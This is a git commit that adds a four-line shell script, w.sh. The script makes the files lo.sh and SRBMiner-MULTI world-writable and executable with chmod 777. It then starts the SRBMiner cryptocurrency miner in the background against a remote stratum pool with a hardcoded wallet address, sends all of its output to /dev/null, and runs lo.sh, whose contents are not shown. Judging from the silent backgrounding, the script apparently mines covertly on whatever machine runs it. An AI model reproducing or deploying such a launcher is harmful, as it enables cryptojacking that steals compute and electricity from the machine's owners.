ac934cae3284c1ae1e32869635ec7ad613de9c6e
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-05-26 19:48:30 +0700

    Create w.sh

---
+++ w.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+chmod 777 lo.sh SRBMiner-MULTI
+./SRBMiner-MULTI --algorithm yespower --pool stratum+tcps://stratum-asia.rplant.xyz:17070 --wallet WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.serbe > /dev/null 2>&1 &
+./lo.sh
